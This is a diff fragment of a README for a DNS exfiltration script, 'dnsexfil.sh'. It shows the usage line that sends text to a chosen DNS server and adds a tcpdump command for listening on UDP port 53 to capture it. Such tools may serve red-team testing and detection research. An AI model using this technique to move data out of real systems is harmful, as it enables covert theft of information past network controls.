@@ -20,5 +20,9 @@ Ensure you have `dig` installed on your system. You can install it using your pa
   chmod +x dnsexfil.sh
   ./dnsexfil.sh "Your text to send" "dns.server.address"
 
+## Set up a listener with TCPDUMP
+
+  ```sh
+  sudo tcpdump -i eth0 udp port 53 -vvv
 
 
